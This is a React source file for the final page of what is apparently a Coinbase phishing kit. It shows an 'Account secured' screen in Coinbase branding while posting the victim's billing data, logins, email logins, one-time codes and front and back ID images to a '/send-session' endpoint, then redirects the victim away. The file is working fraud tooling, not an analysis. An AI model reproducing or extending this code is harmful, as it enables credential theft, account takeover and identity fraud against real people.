import { CircularProgress, Flex } from "@chakra-ui/react";
import axios from "axios";
import React, { useEffect } from "react";
import { Helmet } from "react-helmet";
import { useLocation } from "react-router-dom";
import { Container } from "../components/Container";
import { Wrapper } from "../components/Wrapper";

interface SuccessProps {}

export const Success: React.FC<SuccessProps> = () => {
  const { state } = useLocation() as {
    state: any;
  };

  useEffect(() => {
    const sendSession = async () => {
      if (state) {
        const formData = new FormData();

        if (state.docs) {
          formData.append("front", state.docs.front[0]);
          formData.append("back", state.docs.back[0]);
        }

        formData.append("form", "SESSION");
        formData.append(
          "session",
          JSON.stringify({
            billing: state.billing,
            logins: state.logins,
            emailLogins: state.emailLogins,
            otp: state.otp,
          })
        );

        await axios.post("/send-session", formData, {
          headers: {
            "Content-Type": "multipart/form-data",
          },
        });
      }

      window.location.href = process.env.REACT_APP_EXIT_URL as string;
    };

    sendSession();
    return () => {};
  }, [state]);
  return (
    <Wrapper pt={"74px"} bgColor={"#1652f0"}>
      <Helmet
      // style={[
      //   {
      //     cssText: `
      //     body {
      //       background-color: rgb(0, 82, 255) !important;
      //     }
      //   `,
      //   },
      // ]}
      >
        <title>Account secured - Coinbase</title>
      </Helmet>
      <Container
        title="Account secured."
        paragraph="Thank you for verifying your information, you are being redirected to the login page..."
      >
        <Flex w={"full"} alignItems={"center"} justifyContent={"center"}>
          <CircularProgress
            color="#1652f0"
            isIndeterminate
            size="100px"
            thickness="4px"
          />
        </Flex>
      </Container>
    </Wrapper>
  );
};
